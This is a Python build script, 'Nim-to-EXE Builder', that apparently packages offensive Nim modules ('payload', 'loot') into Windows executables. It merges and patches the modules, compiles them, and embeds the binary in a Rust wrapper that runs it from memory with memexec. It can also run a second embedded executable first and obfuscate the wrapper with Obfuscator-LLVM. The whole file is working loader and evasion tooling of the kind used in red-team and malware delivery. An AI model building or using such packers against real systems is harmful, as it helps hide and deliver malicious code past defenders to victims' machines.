#!/usr/bin/env python3
import argparse
from pathlib import Path
import sys
import os
import shutil
import re
import shlex
import subprocess
import tempfile
def compile_nim(nim_file, output_exe, os_name, arch):
    output_exe = Path(output_exe).resolve()
    print(f"[*] Compiling Nim -> {os_name}:{arch}")

    nim_cmd = [
        "nim", "c",
        "-d:release",
        "-d:ssl",
    ]
    if os_name == "windows":
        if sys.platform == "darwin":
            nim_cmd.append("-d:mingw")
            nim_cmd.append(f"--cpu:{arch}")
        else:
            nim_cmd.append("--os:windows")
            nim_cmd.append(f"--cpu:{arch}")

    elif os_name == "linux":
        nim_cmd.append("--os:linux")
        nim_cmd.append(f"--cpu:{arch}")

    elif os_name == "macos":
        nim_cmd.append("--os:macosx")
        nim_cmd.append(f"--cpu:{arch}")

    nim_cmd.append(f'--out:{output_exe}')
    nim_cmd.append(str(nim_file))

    print(f"[*] Running Nim compile command: {' '.join(shlex.quote(arg) for arg in nim_cmd)}")
    try:
        result = subprocess.run(nim_cmd, check=True, capture_output=True, text=True)
        print("[+] Nim compiler output:")
        print(result.stdout)
        if result.stderr:
            print("[+] Nim compiler errors:")
            print(result.stderr)
    except subprocess.CalledProcessError as e:
        print(f"[Error] Nim compilation failed with exit code {e.returncode}.")
        print("--- stdout ---")
        print(e.stdout)
        print("--- stderr ---")
        print(e.stderr)
        sys.exit(1)
    except FileNotFoundError:
        print("[Error] 'nim' command not found. Please ensure Nim is installed and in your PATH.")
        sys.exit(1)

    if not output_exe.exists():
        print(f"[Error] Nim compiler finished, but output file was not found at: {output_exe}")
        sys.exit(1)
    print(f"[+] Built Nim executable: {output_exe}")
    return output_exe

def normalize_imports(lines):
    """Normalize Nim import statements by splitting comma-separated imports."""
    result = []
    for line in lines:
        s = line.strip()
        if s.startswith("import "):
            mods = s[len("import "):].split(",")
            for m in mods:
                result.append("import " + m.strip())
        else:
            result.append(line.rstrip("\n"))
    return result

def extract_main_proc(nim_content):
    """Extract the content of proc main(), normalizing its indentation."""
    lines = nim_content.splitlines()
    main_content = []
    in_main = False
    proc_indent_level = 0
    base_content_indent = -1

    for line in lines:
        stripped_line = line.strip()
        if stripped_line.startswith("proc main()"):
            in_main = True
            proc_indent_level = len(line) - len(line.lstrip())
            continue

        if in_main:
            current_indent = len(line) - len(line.lstrip())
            if current_indent <= proc_indent_level and stripped_line and not line.isspace():
                in_main = False
                continue

            if stripped_line:
                if base_content_indent == -1:
                    base_content_indent = current_indent
                relative_indent = current_indent - base_content_indent
                main_content.append(" " * relative_indent + stripped_line)
    return main_content

def apply_options_with_regex(content, options):
    """
    Applies build options to the Nim source content using regex substitution.
    It looks for patterns like:
    let/const/var optionName = "default value"
    let/const/var optionName = someFunc("default value")
    """
    if not options:
        return content

    for option in options:
        key, value = option.split("=", 1)
        escaped_value = value.replace('\\', '\\\\').replace('"', '\\"')
        pattern = re.compile(r'((?:let|const|var)\s+' + re.escape(key) + r'\s*=\s*(?:[a-zA-Z0-9_]+\()?)".*?"', re.DOTALL)
        content = pattern.sub(r'\1"' + escaped_value + '"', content, count=1)
    return content

def merge_nim_modules(nim_files, out_dir: Path, options=None):
    """Merge multiple Nim modules into a single file, deduplicating imports and combining proc main()."""
    if len(nim_files) < 2:
        print("[Error] At least two Nim files must be provided for merging.")
        sys.exit(1)

    print(f"[*] Merging modules: {nim_files}")
    loot_dir = out_dir
    loot_dir.mkdir(parents=True, exist_ok=True)
    out_path = loot_dir / "combined.nim"

    merged_imports = set()
    merged_code = []
    main_contents = []

    for f in nim_files:
        fpath = Path(f)
        if not fpath.is_file():
            print(f"[Error] Nim file not found: {f}")
            sys.exit(1)
        print(f"[*] Reading module: {f}")
        with open(f, "r", encoding="utf-8") as fh:
            content = fh.read()
        
        content = apply_options_with_regex(content, options)

        main_contents.append(extract_main_proc(content))

        lines = content.splitlines()
        in_main_proc = False
        main_proc_indent = -1
        in_when_block = False
        when_block_indent = -1
        in_gorge_proc = False

        for line in lines:
            stripped = line.strip()

            if in_main_proc and stripped and (len(line) - len(line.lstrip()) <= main_proc_indent):
                in_main_proc = False
            if in_when_block and stripped and (len(line) - len(line.lstrip()) <= when_block_indent):
                in_when_block = False
            if in_gorge_proc and stripped and (len(line) - len(line.lstrip()) == 0):
                in_gorge_proc = False

            if in_main_proc or in_when_block:
                continue

            if stripped.startswith("proc main()"):
                in_main_proc = True
                main_proc_indent = len(line) - len(line.lstrip())
                continue
            if stripped.startswith("when isMainModule"):
                in_when_block = True
                when_block_indent = len(line) - len(line.lstrip())
                continue
            
            if stripped.startswith("import "):
                mods = stripped[len("import "):].split(",")
                for m in mods:
                    merged_imports.add("import " + m.strip())
            else:
                merged_code.append(line.rstrip("\n"))

    final_code = []
    if merged_code:
        final_code.append(merged_code[0])
        for i in range(1, len(merged_code)):
            if merged_code[i].strip() == "" and merged_code[i-1].strip() == "":
                continue
            final_code.append(merged_code[i])

    with open(out_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(sorted(merged_imports)))
        fh.write("\n\n")
        fh.write("\n".join(final_code))
        fh.write("\n\n")
        fh.write("proc main() =\n")
        for main_content in main_contents:
            if not main_content:
                continue
            fh.write("  block:\n")
            for line in main_content:
                fh.write("    " + line + "\n")
        fh.write("\n")
        fh.write("when isMainModule:\n")
        fh.write("  main()\n")

    print(f"[+] Wrote merged Nim file: {out_path}")
    return out_path

def patch_nim_file(nim_file: Path, options: list):
    """Injects const declarations into a single Nim file."""
    if options:
        print(f"[*] Patching {nim_file.name} with options: {options}")
        content = nim_file.read_text(encoding="utf-8")
        
        content = apply_options_with_regex(content, options)
        nim_file.write_text(content, encoding="utf-8")

def parse_target(target_str):
    """Parse the target string into OS and architecture."""
    try:
        os_name, arch = target_str.split(":")
        return os_name, arch
    except ValueError:
        print("[Error] Target must be in format os:arch, e.g. windows:amd64")
        sys.exit(1)


def generate_rust_wrapper(nim_exe, final_exe, target_os, target_arch, embed_exe=None, obfuscate=False, ollvm=None):
    """Generate a Rust wrapper for the Nim executable using in-memory execution."""
    final_exe_path = Path(final_exe)
    package_name = final_exe_path.stem

    if obfuscate:
        docker_path = shutil.which("docker")
        if not docker_path:
            print("[Error] Docker not found. Install Docker to use Obfuscator-LLVM.")
            sys.exit(1)
        print(f"[*] Found docker at: {docker_path}")

    with open(nim_exe, 'rb') as f:
        nim_payload_bytes = f.read()

    nim_payload_array = ','.join(str(b) for b in nim_payload_bytes)

    embed_decl = ""
    embed_code = ""
    if embed_exe:
        with open(embed_exe, "rb") as f:
            embed_bytes = f.read()
        embed_bytes_array = ','.join(str(b) for b in embed_bytes)
        embed_decl = f"const EMBEDDED_EXE: &[u8] = &[{embed_bytes_array}];"
        embed_code = """
    // Run embedded EXE first
    unsafe {
        memexec::memexec_exe(EMBEDDED_EXE).expect("Failed to execute embedded EXE");
    }
"""

    rust_code = f'''
use memexec;

{embed_decl}
const NIM_PAYLOAD: &[u8] = &[{nim_payload_array}];

fn main() {{
{embed_code}
    unsafe {{
        memexec::memexec_exe(NIM_PAYLOAD).expect("Failed to execute Nim payload from memory");
    }}
}}
'''
    with tempfile.TemporaryDirectory() as tmpdir:
        project_dir = Path(tmpdir) / "rust_project"
        src_dir = project_dir / "src"
        src_dir.mkdir(parents=True)

        main_rs = src_dir / "main.rs"
        main_rs.write_text(rust_code)
        print(f"[*] Wrote Rust wrapper source: {main_rs}")

        cargo_toml_content = f"""
[package]
name = "{package_name}"
version = "0.1.0"
edition = "2018"

[dependencies]
memexec = {{ git = "https://github.com/DmitrijVC/memexec", version = "0.3" }}
"""
        (project_dir / "Cargo.toml").write_text(cargo_toml_content.strip())

        rust_target = {
            ("windows", "amd64"): "x86_64-pc-windows-gnu",
            ("windows", "arm64"): "aarch64-pc-windows-gnu",
            ("linux", "amd64"): "x86_64-unknown-linux-gnu",
            ("linux", "arm64"): "aarch64-unknown-linux-gnu",
            ("macos", "amd64"): "x86_64-apple-darwin",
            ("macos", "arm64"): "aarch64-apple-darwin"
        }[(target_os, target_arch)]

        cargo_cmd = [
            "cargo", "build", "--release", "--target", rust_target
        ]

        if obfuscate:
            project_path = str(project_dir)
            volume_mapping = f"{project_path}:/projects"

            if ollvm:
                for pass_name in ollvm:
                    cargo_cmd.append(f"-Cllvm-args=-enable-{pass_name}")
            else:
                cargo_cmd.append("-Cllvm-args=-enable-allobf")

            docker_cmd = [
                "docker", "run", "--rm",
                "-v", volume_mapping,
                "-w", "/projects",
                "ghcr.io/joaovarelas/obfuscator-llvm-16.0:latest",
                *cargo_cmd
            ]
            print(f"[*] Running Dockerized cargo rustc command: {' '.join(docker_cmd)}")
            try:
                subprocess.run(docker_cmd, check=True, capture_output=True, text=True)
            except subprocess.CalledProcessError as e:
                print(f"[Error] Dockerized Rust compilation failed: {e}")
                print(f"Stdout: {e.stdout}")
                print(f"Stderr: {e.stderr}")
                sys.exit(1)
        else:
            print(f"[*] Running local cargo rustc command: {' '.join(cargo_cmd)}")
            try:
                subprocess.run(cargo_cmd, check=True, cwd=project_dir, capture_output=True, text=True)
            except subprocess.CalledProcessError as e:
                print(f"[Error] Rust compilation failed: {e}")
                print(f"Stdout: {e.stdout}")
                print(f"Stderr: {e.stderr}")
                sys.exit(1)
            except FileNotFoundError:
                print("[Error] 'cargo' command not found. Please ensure Rust is installed and in your PATH.")
                sys.exit(1)

        output_binary_name = f"{package_name}.exe" if target_os == "windows" else package_name
        compiled_binary = project_dir / "target" / rust_target / "release" / output_binary_name
        if not compiled_binary.exists():
            print(f"[Error] Compiled binary not found at: {compiled_binary}")
            sys.exit(1)
        shutil.move(str(compiled_binary), final_exe_path)
        print(f"[+] Final executable: {final_exe_path}")

def main():
    parser = argparse.ArgumentParser(description="Nim-to-EXE Builder")
    parser.add_argument("--nim_file", type=str, help="Path to a single Nim file")
    parser.add_argument("--merge", nargs="+", help="List of Nim modules to embed")
    parser.add_argument("--output_exe", type=str, required=True, help="Output executable name")
    parser.add_argument("--embed", type=str, help="Path to additional exe to embed & run")
    parser.add_argument("--nim-only", action="store_true", help="Only build Nim exe (no Rust)")
    parser.add_argument("--obfuscate", action="store_true", help="Enable Rust OLLVM obfuscation")
    parser.add_argument("--ollvm", nargs="*", help="OLLVM passes: bcfobf subobf constenc ...")
    parser.add_argument("--target", type=str, default="windows:amd64", help="Target triple (os:arch)")
    parser.add_argument("--option", action="append", help="Option to inject as const (e.g., key=value)")

    args = parser.parse_args()

    if args.merge and args.nim_file:
        print("[Error] Cannot specify both --merge and --nim_file options.")
        sys.exit(1)
    if not args.merge and not args.nim_file:
        print("[Error] Must specify either --merge or --nim_file.")
        sys.exit(1)

    target_os, target_arch = parse_target(args.target)

    final_exe_path_str = args.output_exe
    if target_os == "windows" and not final_exe_path_str.lower().endswith(".exe"):
        final_exe_path_str += ".exe"
        print(f"[+] Corrected output name to: {Path(final_exe_path_str).name}")

    final_exe = Path(final_exe_path_str).resolve()
    final_exe.parent.mkdir(parents=True, exist_ok=True)

    with tempfile.TemporaryDirectory() as tmpdir:
        tmp_dir = Path(tmpdir)
        if args.merge:
            loot_dir = final_exe.parent
            launcher_source = merge_nim_modules(args.merge, loot_dir, options=args.option)
        else:
            launcher_source = Path(args.nim_file)
            patch_nim_file(launcher_source, args.option)

        suffix = ".exe" if target_os == "windows" else ""
        nim_exe_tmp = tmp_dir / f"{final_exe.stem}_nim_payload{suffix}"
        compile_nim(launcher_source, nim_exe_tmp, target_os, target_arch)

        if not args.nim_only and target_os == 'windows':
            print("[*] Generating Rust wrapper to embed Nim payload.")
            generate_rust_wrapper(
                str(nim_exe_tmp),
                final_exe,
                target_os, target_arch,
                embed_exe=args.embed,
                obfuscate=args.obfuscate,
                ollvm=args.ollvm
            )
        else:
            if not args.nim_only and target_os != 'windows':
                print(f"[*] Skipping Rust wrapper for non-Windows target ({target_os}).")
            shutil.move(str(nim_exe_tmp), final_exe)
            print(f"[+] Final executable: {final_exe}")

if __name__ == "__main__":
    main()